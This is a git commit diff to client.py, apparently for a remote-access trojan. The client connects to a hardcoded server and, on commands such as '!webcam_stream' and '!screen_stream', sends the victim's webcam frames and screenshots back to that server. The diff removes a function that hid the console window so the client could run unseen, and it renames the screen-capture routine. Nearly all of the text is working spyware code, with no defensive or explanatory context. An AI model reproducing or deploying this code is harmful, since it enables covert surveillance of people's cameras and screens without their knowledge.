dbd749e22982b9a7f4f1b34965bff93626c44a44
mephisto-v <agentunknown@infopeklo.cz>
2025-03-08 17:52:30 +0100

    Update client.py

--- client.py
+++ client.py
@@ -1,29 +1,29 @@
 import socket
 import cv2
+import pyautogui
 import threading
 import requests
 import os
 import time
 from PIL import ImageGrab
 from io import BytesIO
-import ctypes
-import sys
-import win32api
-import pyautogui
-
-# Function to hide the console window
-def hide_console():
-    if sys.platform == "win32":
-        ctypes.windll.kernel32.FreeConsole()
 
 # Connect to the server
-SERVER_IP = "10.0.1.33"  # Replace with the server IP address
+SERVER_IP = "10.0.1.33"
 SERVER_PORT = 9999
 client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-# Send webcam feed to the server
+def send_screenshot():
+    while True:
+        screenshot = ImageGrab.grab()
+        img_byte_arr = BytesIO()
+        screenshot.save(img_byte_arr, format="JPEG")
+        img_data = img_byte_arr.getvalue()
+        client_socket.sendall(img_data)
+        time.sleep(1)
+
 def send_webcam():
-    cap = cv2.VideoCapture(0)  # Open the default webcam
+    cap = cv2.VideoCapture(0)
     while True:
         ret, frame = cap.read()
         if ret:
@@ -32,17 +32,6 @@ def send_webcam():
             client_socket.sendall(img_data)
         time.sleep(1)
 
-# Send screen capture to the server
-def send_screen():
-    while True:
-        screenshot = ImageGrab.grab()  # Capture the screen
-        img_byte_arr = BytesIO()
-        screenshot.save(img_byte_arr, format="JPEG")
-        img_data = img_byte_arr.getvalue()
-        client_socket.sendall(img_data)
-        time.sleep(1)
-
-# Receive commands from the server
 def receive_commands():
     while True:
         command = client_socket.recv(1024).decode()
@@ -52,19 +41,11 @@ def receive_commands():
         if command == "!webcam_stream":
             threading.Thread(target=send_webcam).start()
         elif command == "!screen_stream":
-            threading.Thread(target=send_screen).start()
+            threading.Thread(target=send_screenshot).start()
 
-# Connect to the server and start receiving commands
 def start_client():
-    try:
-        client_socket.connect((SERVER_IP, SERVER_PORT))
-        print("[+] Connected to the server.")
-        threading.Thread(target=receive_commands).start()
-    except Exception as e:
-        print(f"[-] Error: {e}")
-        sys.exit(1)
+    client_socket.connect((SERVER_IP, SERVER_PORT))
+    threading.Thread(target=receive_commands).start()
 
-# Main function to run the client
 if __name__ == "__main__":
-    hide_console()  # Hide the console window to run in the background
     start_client()
